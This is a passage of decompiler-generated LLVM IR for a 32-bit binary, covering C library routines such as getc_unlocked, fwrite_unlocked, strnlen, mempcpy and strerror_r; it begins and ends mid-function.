  uselistorder i32 %v2_804e9b5, { 1, 2, 0 }
  uselistorder i32 %v0_804e98d, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804e983, { 1, 2, 0 }
  uselistorder i32 %v6_804e981, { 0, 2, 1 }
  uselistorder i32 %v0_804e980, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804e979, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804e979, { 2, 1, 0 }
  uselistorder i32 %v1_804e971, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804e957, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804e92d, { 0, 2, 1 }
  uselistorder i32 %v0_804e91a, { 2, 0, 1 }
  uselistorder i32 %v4_804e8b4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 224, { 1, 0, 2 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 3, 0, 1, 2 }
  uselistorder i32 -134548499, { 1, 0 }
  uselistorder i32 17, { 0, 2, 4, 3, 1 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8050c1d.121 to i32), { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 8, 0, 1, 2, 5, 6, 7, 3 }
  uselistorder i32 68, { 2, 3, 0, 4, 1 }
  uselistorder i32 5, { 1, 2, 9, 7, 10, 11, 8, 13, 14, 15, 0, 6, 3, 4, 12, 5, 16, 17 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32 -48, { 1, 2, 3, 4, 0 }
  uselistorder i32* @global_var_8052038, { 5, 0, 6, 2, 7, 1, 3, 8, 4 }
  uselistorder i32 80, { 5, 6, 7, 8, 9, 10, 1, 0, 2, 3, 4 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804ec78, { 1, 0 }
  uselistorder label %dec_label_pc_804ec75, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec69, { 1, 0 }
  uselistorder label %dec_label_pc_804ec3e, { 1, 0 }
  uselistorder label %dec_label_pc_804ec03, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eba7, { 1, 0 }
  uselistorder label %dec_label_pc_804eb7b, { 1, 0 }
  uselistorder label %dec_label_pc_804eae3, { 1, 0 }
  uselistorder label %dec_label_pc_804eaaf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ea86, { 1, 0 }
  uselistorder label %dec_label_pc_804ea5d, { 1, 0 }
  uselistorder label %dec_label_pc_804ea24, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804e9c7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e981, { 1, 0 }
  uselistorder label %dec_label_pc_804e980, { 1, 0 }
  uselistorder label %dec_label_pc_804e967, { 1, 0 }
  uselistorder label %dec_label_pc_804e950, { 1, 0 }
  uselistorder label %dec_label_pc_804e950.outer, { 2, 0, 1 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_2()
  %stack_var_-5 = alloca i8, align 1
  %v0_804ec80 = load i32, i32* @ebx, align 4
  %v4_804ec84 = ptrtoint i16* %tmp to i32
  store i32 %v4_804ec84, i32* @ebx, align 4
  %v1_804ec88 = add i32 %v4_804ec84, 16
  %v2_804ec88 = inttoptr i32 %v1_804ec88 to i32*
  %v3_804ec88 = load i32, i32* %v2_804ec88, align 4
  %v2_804ec8b = add i32 %v4_804ec84, 24
  %v3_804ec8b = inttoptr i32 %v2_804ec8b to i32*
  %v4_804ec8b = load i32, i32* %v3_804ec8b, align 4
  %v10_804ec8b = icmp ult i32 %v3_804ec88, %v4_804ec8b
  br i1 %v10_804ec8b, label %dec_label_pc_804ed2d, label %dec_label_pc_804ec94

dec_label_pc_804ec94:                             ; preds = %entry
  %v2_804ec94 = load i16, i16* %tmp, align 2
  %v3_804ec94 = zext i16 %v2_804ec94 to i32
  %v1_804ec97 = and i32 %v3_804ec94, 131
  %v6_804eca1 = icmp ugt i32 %v1_804ec97, 128
  br i1 %v6_804eca1, label %dec_label_pc_804ecbb, label %dec_label_pc_804eca3

dec_label_pc_804eca3:                             ; preds = %dec_label_pc_804ec94
  %v0_804eca3 = load i32, i32* @edx, align 4
  %v6_804ecab = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_804eca3, i32 %v0_804eca3)
  %v1_804ecb3 = icmp eq i32 %v6_804ecab, 0
  %v1_804ecb5 = icmp eq i1 %v1_804ecb3, false
  br i1 %v1_804ecb5, label %dec_label_pc_804ed52, label %dec_label_pc_804eca3.dec_label_pc_804ecbb_crit_edge

dec_label_pc_804eca3.dec_label_pc_804ecbb_crit_edge: ; preds = %dec_label_pc_804eca3
  %v0_804ecbb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ecbb

dec_label_pc_804ecbb:                             ; preds = %dec_label_pc_804eca3.dec_label_pc_804ecbb_crit_edge, %dec_label_pc_804ec94
  %v2_804ecef = phi i32 [ %v0_804ecbb.pre, %dec_label_pc_804eca3.dec_label_pc_804ecbb_crit_edge ], [ %v4_804ec84, %dec_label_pc_804ec94 ]
  %v1_804ecbb = inttoptr i32 %v2_804ecef to i16*
  %v2_804ecbb = load i16, i16* %v1_804ecbb, align 2
  %v3_804ecbb = zext i16 %v2_804ecbb to i32
  store i32 %v3_804ecbb, i32* @ecx, align 4
  %v2_804ecbe = and i16 %v2_804ecbb, 2
  %v3_804ecbe = icmp eq i16 %v2_804ecbe, 0
  br i1 %v3_804ecbe, label %dec_label_pc_804ecde, label %dec_label_pc_804ecc3

dec_label_pc_804ecc3:                             ; preds = %dec_label_pc_804ecbb
  %tmp20 = urem i16 %v2_804ecbb, 2
  %v1_804ecc5 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_804ecc5
  %v2_804ecc8 = and i32 %tmp19, 4
  %v3_804ecc8 = add i32 %v2_804ecef, 36
  %v4_804ecc8 = add i32 %v3_804ecc8, %v2_804ecc8
  %v5_804ecc8 = inttoptr i32 %v4_804ecc8 to i8*
  %v6_804ecc8 = load i8, i8* %v5_804ecc8, align 1
  %v7_804ecc8 = zext i8 %v6_804ecc8 to i32
  %v8_804ecc8 = load i32, i32* @edx, align 4
  %v9_804ecc8 = and i32 %v8_804ecc8, -256
  %v10_804ecc8 = or i32 %v9_804ecc8, %v7_804ecc8
  store i32 %v10_804ecc8, i32* %edx.global-to-local, align 4
  %v1_804eccc = add i16 %v2_804ecbb, -1
  store i16 %v1_804eccc, i16* %v1_804ecbb, align 2
  %v0_804ecd2 = load i32, i32* @ebx, align 4
  %v1_804ecd2 = add i32 %v0_804ecd2, 40
  %v2_804ecd2 = inttoptr i32 %v1_804ecd2 to i32*
  store i32 0, i32* %v2_804ecd2, align 4
  %v0_804ecd9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ecd9 = urem i32 %v0_804ecd9, 256
  store i32 %v1_804ecd9, i32* @edx, align 4
  br label %dec_label_pc_804ed55

dec_label_pc_804ecde:                             ; preds = %dec_label_pc_804ecbb
  %v1_804ecde = add i32 %v2_804ecef, 16
  %v2_804ecde = inttoptr i32 %v1_804ecde to i32*
  %v3_804ecde = load i32, i32* %v2_804ecde, align 4
  store i32 %v3_804ecde, i32* @eax, align 4
  %v1_804ece1 = add i32 %v2_804ecef, 20
  %v2_804ece1 = inttoptr i32 %v1_804ece1 to i32*
  %v3_804ece1 = load i32, i32* %v2_804ece1, align 4
  %v15_804ece1 = icmp eq i32 %v3_804ece1, %v3_804ecde
  %v1_804ece4 = icmp eq i1 %v15_804ece1, false
  br i1 %v1_804ece4, label %dec_label_pc_804ed2d, label %dec_label_pc_804ece6

dec_label_pc_804ece6:                             ; preds = %dec_label_pc_804ecde
  %v1_804ece6 = add i32 %v2_804ecef, 4
  %v2_804ece6 = inttoptr i32 %v1_804ece6 to i32*
  %v3_804ece6 = load i32, i32* %v2_804ece6, align 4
  %v13_804ece6 = icmp eq i32 %v3_804ece6, -2
  %v1_804ecea = icmp eq i1 %v13_804ece6, false
  br i1 %v1_804ecea, label %dec_label_pc_804ecf4, label %dec_label_pc_804ecec

dec_label_pc_804ecec:                             ; preds = %dec_label_pc_804ece6
  %v1_804ecec = or i32 %v3_804ecbb, 4
  store i32 %v1_804ecec, i32* @ecx, align 4
  %v1_804ecef = trunc i32 %v1_804ecec to i16
  store i16 %v1_804ecef, i16* %v1_804ecbb, align 2
  br label %dec_label_pc_804ed52

dec_label_pc_804ecf4:                             ; preds = %dec_label_pc_804ece6
  %v3_804ecf4 = and i16 %v2_804ecbb, 768
  %v4_804ecf4 = icmp eq i16 %v3_804ecf4, 0
  br i1 %v4_804ecf4, label %dec_label_pc_804ed09, label %dec_label_pc_804ecf9

dec_label_pc_804ecf9:                             ; preds = %dec_label_pc_804ecf4
  %v3_804ed01 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805218c.104 to i16*))
  %v0_804ed09.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ed09

dec_label_pc_804ed09:                             ; preds = %dec_label_pc_804ecf4, %dec_label_pc_804ecf9
  %v0_804ed3e = phi i32 [ %v2_804ecef, %dec_label_pc_804ecf4 ], [ %v0_804ed09.pre, %dec_label_pc_804ecf9 ]
  %v1_804ed09 = add i32 %v0_804ed3e, 8
  %v2_804ed09 = inttoptr i32 %v1_804ed09 to i32*
  %v3_804ed09 = load i32, i32* %v2_804ed09, align 4
  %v1_804ed0c = add i32 %v0_804ed3e, 12
  %v2_804ed0c = inttoptr i32 %v1_804ed0c to i32*
  %v3_804ed0c = load i32, i32* %v2_804ed0c, align 4
  %v15_804ed0c = icmp eq i32 %v3_804ed0c, %v3_804ed09
  br i1 %v15_804ed0c, label %dec_label_pc_804ed36, label %dec_label_pc_804ed11

dec_label_pc_804ed11:                             ; preds = %dec_label_pc_804ed09
  %v2_804ed14 = add i32 %v0_804ed3e, 24
  %v3_804ed14 = inttoptr i32 %v2_804ed14 to i32*
  store i32 %v3_804ed09, i32* %v3_804ed14, align 4
  %v0_804ed17 = load i32, i32* @ebx, align 4
  %v2_804ed18 = call i32 @__stdio_rfill(i32 %v0_804ed17)
  %v1_804ed20 = icmp eq i32 %v2_804ed18, 0
  br i1 %v1_804ed20, label %dec_label_pc_804ed52, label %dec_label_pc_804ed24

dec_label_pc_804ed24:                             ; preds = %dec_label_pc_804ed11
  %v0_804ed24 = load i32, i32* @ebx, align 4
  %v1_804ed24 = add i32 %v0_804ed24, 20
  %v2_804ed24 = inttoptr i32 %v1_804ed24 to i32*
  %v3_804ed24 = load i32, i32* %v2_804ed24, align 4
  %v2_804ed27 = add i32 %v0_804ed24, 24
  %v3_804ed27 = inttoptr i32 %v2_804ed27 to i32*
  store i32 %v3_804ed24, i32* %v3_804ed27, align 4
  %v0_804ed2a = load i32, i32* @ebx, align 4
  %v1_804ed2a = add i32 %v0_804ed2a, 16
  %v2_804ed2a = inttoptr i32 %v1_804ed2a to i32*
  %v3_804ed2a = load i32, i32* %v2_804ed2a, align 4
  br label %dec_label_pc_804ed2d

dec_label_pc_804ed2d:                             ; preds = %dec_label_pc_804ecde, %entry, %dec_label_pc_804ed24
  %v1_804ed31 = phi i32 [ %v2_804ecef, %dec_label_pc_804ecde ], [ %v4_804ec84, %entry ], [ %v0_804ed2a, %dec_label_pc_804ed24 ]
  %v0_804ed2d = phi i32 [ %v3_804ecde, %dec_label_pc_804ecde ], [ %v3_804ec88, %entry ], [ %v3_804ed2a, %dec_label_pc_804ed24 ]
  %v1_804ed2d = inttoptr i32 %v0_804ed2d to i8*
  %v2_804ed2d = load i8, i8* %v1_804ed2d, align 1
  %v3_804ed2d = zext i8 %v2_804ed2d to i32
  store i32 %v3_804ed2d, i32* @edx, align 4
  %v1_804ed30 = add i32 %v0_804ed2d, 1
  %v2_804ed31 = add i32 %v1_804ed31, 16
  %v3_804ed31 = inttoptr i32 %v2_804ed31 to i32*
  store i32 %v1_804ed30, i32* %v3_804ed31, align 4
  %v0_804ed58.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ed55

dec_label_pc_804ed36:                             ; preds = %dec_label_pc_804ed09
  %v2_804ed39 = ptrtoint i8* %stack_var_-5 to i32
  %v5_804ed3e = inttoptr i32 %v0_804ed3e to i16*
  %v5_804ed3f = call i32 @__stdio_READ(i16* %v5_804ed3e, i32 %v2_804ed39, i32 1)
  %v1_804ed47 = icmp eq i32 %v5_804ed3f, 0
  br i1 %v1_804ed47, label %dec_label_pc_804ed52, label %dec_label_pc_804ed4b

dec_label_pc_804ed4b:                             ; preds = %dec_label_pc_804ed36
  %v3_804ed4b = load i8, i8* %stack_var_-5, align 1
  %v4_804ed4b = sext i8 %v3_804ed4b to i32
  store i32 %v4_804ed4b, i32* @edx, align 4
  br label %dec_label_pc_804ed55

dec_label_pc_804ed52:                             ; preds = %dec_label_pc_804ed36, %dec_label_pc_804ed11, %dec_label_pc_804eca3, %dec_label_pc_804ecec
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_804ed55

dec_label_pc_804ed55:                             ; preds = %dec_label_pc_804ed4b, %dec_label_pc_804ed2d, %dec_label_pc_804ecc3, %dec_label_pc_804ed52
  %v0_804ed58 = phi i32 [ %v4_804ed4b, %dec_label_pc_804ed4b ], [ %v0_804ed58.pre, %dec_label_pc_804ed2d ], [ %v1_804ecd9, %dec_label_pc_804ecc3 ], [ -1, %dec_label_pc_804ed52 ]
  store i32 %v0_804ec80, i32* @ebx, align 4
  ret i32 %v0_804ed58

; uselistorder directives
  uselistorder i32 %v0_804ed2d, { 1, 0 }
  uselistorder i32 %v3_804ed09, { 1, 0 }
  uselistorder i32 %v0_804ed3e, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804ecde, { 1, 0, 2 }
  uselistorder i32 %v1_804ecd9, { 1, 0 }
  uselistorder i16 %v2_804ecbb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804ecef, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_80521e0.103, { 2, 1, 0 }
  uselistorder i32 36, { 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 1, 2, 19, 3 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_804ed55, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ed52, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ed2d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ed09, { 1, 0 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-8 = alloca i32, align 4
  %v0_804ed5c = load i32, i32* @esi, align 4
  %v0_804ed5d = load i32, i32* @ebx, align 4
  store i32 %v0_804ed5d, i32* %stack_var_-8, align 4
  %v4_804ed61 = ptrtoint i8* %tmp3 to i32
  store i32 %v4_804ed61, i32* @ebx, align 4
  %v3_804ed66 = call i32 @strlen(i8* %tmp3)
  store i32 %v3_804ed66, i32* @esi, align 4
  %v0_804ed77 = load i32, i32* @ebx, align 4
  %v6_804ed78 = call i32 @__GI_fwrite_unlocked(i32 %v0_804ed77, i64 1, i32 %v3_804ed66, i32 %tmp)
  %v1_804ed82 = load i32, i32* @esi, align 4
  %v12_804ed82 = icmp eq i32 %v6_804ed78, %v1_804ed82
  %v3_804ed84 = select i1 %v12_804ed82, i32 %v6_804ed78, i32 -1
  %v2_804ed8a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ed8a, i32* @ebx, align 4
  store i32 %v0_804ed5c, i32* @esi, align 4
  ret i32 %v3_804ed84

; uselistorder directives
  uselistorder i32 %v6_804ed78, { 1, 0 }
  uselistorder i8* %tmp3, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804ed90 = load i32, i32* @edi, align 4
  %v0_804ed91 = load i32, i32* @esi, align 4
  %v0_804ed92 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804ed97 = trunc i64 %arg2 to i32
  store i32 %v4_804ed97, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804ed9f = inttoptr i32 %arg4 to i16*
  %v2_804ed9f = load i16, i16* %v1_804ed9f, align 2
  %v1_804eda2 = and i16 %v2_804ed9f, 192
  %v6_804eda7 = icmp eq i16 %v1_804eda2, 192
  br i1 %v6_804eda7, label %dec_label_pc_804edc2, label %dec_label_pc_804edae

dec_label_pc_804edae:                             ; preds = %entry
  %v0_804edae = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804edb6 = call i32 @__stdio_trans2w_o(i16* %v1_804ed9f, i32 128, i32 %v0_804edae, i32 %v0_804edae, i32 %v0_804ed92, i32 %v0_804ed91, i32 %v0_804ed90)
  %v1_804edbe = icmp eq i32 %v9_804edb6, 0
  %v1_804edc0 = icmp eq i1 %v1_804edbe, false
  br i1 %v1_804edc0, label %dec_label_pc_804ee02, label %dec_label_pc_804edc2

dec_label_pc_804edc2:                             ; preds = %dec_label_pc_804edae, %entry
  %v2_804edc2 = icmp eq i32 %v4_804ed97, 0
  br i1 %v2_804edc2, label %dec_label_pc_804ee02, label %dec_label_pc_804edc6

dec_label_pc_804edc6:                             ; preds = %dec_label_pc_804edc2
  %v1_804edc6 = icmp eq i32 %arg3, 0
  br i1 %v1_804edc6, label %dec_label_pc_804ee02, label %dec_label_pc_804edca

dec_label_pc_804edca:                             ; preds = %dec_label_pc_804edc6
  %v9_804edcf = udiv i64 4294967295, %arg2
  %v10_804edcf = trunc i64 %v9_804edcf to i32
  %v6_804edd3 = icmp ult i32 %v10_804edcf, %arg3
  br i1 %v6_804edd3, label %dec_label_pc_804edef, label %dec_label_pc_804edd5

dec_label_pc_804edd5:                             ; preds = %dec_label_pc_804edca
  %sext = mul i64 %arg2, 4294967296
  %v2_804edd8 = sdiv i64 %sext, 4294967296
  %v3_804edd8 = sext i32 %arg3 to i64
  %v4_804edd8 = mul nsw i64 %v3_804edd8, %v2_804edd8
  %v5_804edd8 = trunc i64 %v4_804edd8 to i32
  %v0_804eddb = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804ede1 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804edd8, i32 %v0_804eddb, i32 %v10_804edcf)
  %v6_804ede1 = sext i32 %v5_804ede1 to i64
  %v10_804edeb = udiv i64 %v6_804ede1, %arg2
  %v11_804edeb = trunc i64 %v10_804edeb to i32
  br label %dec_label_pc_804ee04

dec_label_pc_804edef:                             ; preds = %dec_label_pc_804edca
  %v0_804edef = load i32, i32* @ebx, align 4
  %v1_804edef = inttoptr i32 %v0_804edef to i32*
  %v2_804edef = load i32, i32* %v1_804edef, align 4
  %v1_804edf1 = or i32 %v2_804edef, 8
  %v1_804edf4 = trunc i32 %v1_804edf1 to i16
  %v3_804edf4 = inttoptr i32 %v0_804edef to i16*
  store i16 %v1_804edf4, i16* %v3_804edf4, align 2
  %v0_804edf7 = load i32, i32* %stack_var_-28, align 4
  %v1_804edf7 = call i32 @__errno_location(i32 %v0_804edf7)
  %v1_804edfc = inttoptr i32 %v1_804edf7 to i32*
  store i32 22, i32* %v1_804edfc, align 4
  br label %dec_label_pc_804ee02

dec_label_pc_804ee02:                             ; preds = %dec_label_pc_804edc6, %dec_label_pc_804edc2, %dec_label_pc_804edae, %dec_label_pc_804edef
  br label %dec_label_pc_804ee04

dec_label_pc_804ee04:                             ; preds = %dec_label_pc_804edd5, %dec_label_pc_804ee02
  %v0_804ee07 = phi i32 [ %v11_804edeb, %dec_label_pc_804edd5 ], [ 0, %dec_label_pc_804ee02 ]
  store i32 %v0_804ed91, i32* @esi, align 4
  store i32 %v0_804ed90, i32* @edi, align 4
  ret i32 %v0_804ee07

; uselistorder directives
  uselistorder i32 %v0_804edae, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 128, { 3, 4, 8, 11, 12, 13, 14, 15, 2, 1, 17, 7, 9, 5, 6, 10, 0, 16 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ee04, { 1, 0 }
  uselistorder label %dec_label_pc_804ee02, { 3, 0, 1, 2 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_4()
  %v4_804ee08 = ptrtoint i8* %tmp4 to i32
  %v8_804ee1b5 = icmp eq i32 %tmp, 0
  %v1_804ee1c7 = icmp eq i1 %v8_804ee1b5, false
  br i1 %v1_804ee1c7, label %dec_label_pc_804ee15, label %dec_label_pc_804ee1e

dec_label_pc_804ee15:                             ; preds = %entry, %dec_label_pc_804ee1a
  %v1_804ee1b9 = phi i32 [ %v1_804ee1b, %dec_label_pc_804ee1a ], [ %tmp, %entry ]
  %v0_804ee1e8 = phi i32 [ %v1_804ee1a, %dec_label_pc_804ee1a ], [ %v4_804ee08, %entry ]
  %v1_804ee15 = inttoptr i32 %v0_804ee1e8 to i8*
  %v2_804ee15 = load i8, i8* %v1_804ee15, align 1
  %v3_804ee15 = icmp eq i8 %v2_804ee15, 0
  br i1 %v3_804ee15, label %dec_label_pc_804ee1e, label %dec_label_pc_804ee1a

dec_label_pc_804ee1a:                             ; preds = %dec_label_pc_804ee15
  %v1_804ee1a = add i32 %v0_804ee1e8, 1
  %v1_804ee1b = add i32 %v1_804ee1b9, -1
  %v8_804ee1b = icmp eq i32 %v1_804ee1b, 0
  %v1_804ee1c = icmp eq i1 %v8_804ee1b, false
  br i1 %v1_804ee1c, label %dec_label_pc_804ee15, label %dec_label_pc_804ee1e

dec_label_pc_804ee1e:                             ; preds = %dec_label_pc_804ee1a, %dec_label_pc_804ee15, %entry
  %v0_804ee1e.lcssa = phi i32 [ %v4_804ee08, %entry ], [ %v0_804ee1e8, %dec_label_pc_804ee15 ], [ %v1_804ee1a, %dec_label_pc_804ee1a ]
  %v2_804ee1e = sub i32 %v0_804ee1e.lcssa, %v4_804ee08
  ret i32 %v2_804ee1e

; uselistorder directives
  uselistorder i32 %v1_804ee1b, { 1, 0 }
  uselistorder i32 %v0_804ee1e8, { 0, 2, 1 }
  uselistorder i32 %v4_804ee08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ee15, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804ee24 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_804ee37 = inttoptr i32 %arg1 to i16*
  %v4_804ee37 = call i32 @memcpy(i16* %v3_804ee37, i32 %arg2, i32 %arg3)
  %v0_804ee3f = load i32, i32* @esi, align 4
  %v2_804ee3f = add i32 %v0_804ee3f, %arg3
  store i32 %v0_804ee24, i32* @esi, align 4
  ret i32 %v2_804ee3f
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804ee59 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804ee61 = load i32, i32* @ebx, align 4
  ret i32 %v0_804ee61
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804ee7a = icmp ugt i32 %arg1, 124
  br i1 %v6_804ee7a, label %dec_label_pc_804ee97, label %dec_label_pc_804ee7c

dec_label_pc_804ee7c:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8050c80.124 to i32), i32* @esi, align 4
  %v1_804ee8c4 = icmp eq i32 %arg1, 0
  %v1_804ee8e11 = icmp eq i1 %v1_804ee8c4, false
  br i1 %v1_804ee8e11, label %dec_label_pc_804ee85, label %dec_label_pc_804ee90

dec_label_pc_804ee85:                             ; preds = %dec_label_pc_804ee7c, %dec_label_pc_804ee85
  %v0_804ee88 = phi i32 [ %v3_804ee88, %dec_label_pc_804ee85 ], [ %arg1, %dec_label_pc_804ee7c ]
  %v0_804ee8b = phi i32 [ %v1_804ee8b, %dec_label_pc_804ee85 ], [ ptrtoint ([8 x i8]* @global_var_8050c80.124 to i32), %dec_label_pc_804ee7c ]
  %v1_804ee85 = inttoptr i32 %v0_804ee8b to i8*
  %v2_804ee85 = load i8, i8* %v1_804ee85, align 1
  %v7_804ee85 = icmp eq i8 %v2_804ee85, 0
  %v2_804ee88 = zext i1 %v7_804ee85 to i32
  %v3_804ee88 = add i32 %v2_804ee88, %v0_804ee88
  %v16_804ee88 = icmp eq i32 %v3_804ee88, 0
  %v1_804ee8b = add i32 %v0_804ee8b, 1
  store i32 %v1_804ee8b, i32* @esi, align 4
  %v1_804ee8e = icmp eq i1 %v16_804ee88, false
  br i1 %v1_804ee8e, label %dec_label_pc_804ee85, label %dec_label_pc_804ee90

dec_label_pc_804ee90:                             ; preds = %dec_label_pc_804ee85, %dec_label_pc_804ee7c
  %v0_804ee92 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8050c80.124 to i32), %dec_label_pc_804ee7c ], [ %v1_804ee8b, %dec_label_pc_804ee85 ]
  store i32 0, i32* @ebp, align 4
  %v1_804ee92 = inttoptr i32 %v0_804ee92 to i8*
  %v2_804ee92 = load i8, i8* %v1_804ee92, align 1
  %v3_804ee92 = icmp eq i8 %v2_804ee92, 0
  %v1_804ee95 = icmp eq i1 %v3_804ee92, false
  br i1 %v1_804ee95, label %dec_label_pc_804ee90.dec_label_pc_804eec6_crit_edge, label %dec_label_pc_804ee97

dec_label_pc_804ee90.dec_label_pc_804eec6_crit_edge: ; preds = %dec_label_pc_804ee90
  br label %dec_label_pc_804eec6

dec_label_pc_804ee97:                             ; preds = %dec_label_pc_804ee90, %entry
  %v1_804ee9a = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804eeab = bitcast i32* %stack_var_-17 to i8*
  %v7_804eeab = call i32 @_uintmaxtostr(i8* %v6_804eeab, i32 %arg1, i32 %v1_804ee9a, i32 -10, i32 0)
  %v1_804eeba = add i32 %v7_804eeab, -14
  store i32 %v1_804eeba, i32* @esi, align 4
  %v5_804eebd = inttoptr i32 %v1_804eeba to i8*
  store i8* %v5_804eebd, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804eeba to i16*
  %v6_804eebe = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8050c5e.125 to i32), i32 14)
  %v1_804eed0.pre = load i32, i32* @edi, align 4
  %v0_804eed6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eec6

dec_label_pc_804eec6:                             ; preds = %dec_label_pc_804ee90.dec_label_pc_804eec6_crit_edge, %dec_label_pc_804ee97
  %v0_804eed6 = phi i32 [ %v0_804ee92, %dec_label_pc_804ee90.dec_label_pc_804eec6_crit_edge ], [ %v0_804eed6.pre, %dec_label_pc_804ee97 ]
  %v1_804eed0 = phi i32 [ %arg3, %dec_label_pc_804ee90.dec_label_pc_804eec6_crit_edge ], [ %v1_804eed0.pre, %dec_label_pc_804ee97 ]
  %v4_804eec6 = icmp eq i32 %arg2, 0
  %v3_804eed0 = select i1 %v4_804eec6, i32 0, i32 %v1_804eed0
  store i32 %v3_804eed0, i32* @edi, align 4
  %v5_804eed6 = inttoptr i32 %v0_804eed6 to i8*
  store i8* %v5_804eed6, i8** %stack_var_-108, align 4
  %v3_804eed7 = call i32 @strlen(i8* %v5_804eed6)
  %v1_804eedf = add i32 %v3_804eed7, 1
  store i32 %v1_804eedf, i32* %ebx.global-to-local, align 4
  %v1_804eee2 = load i32, i32* @edi, align 4
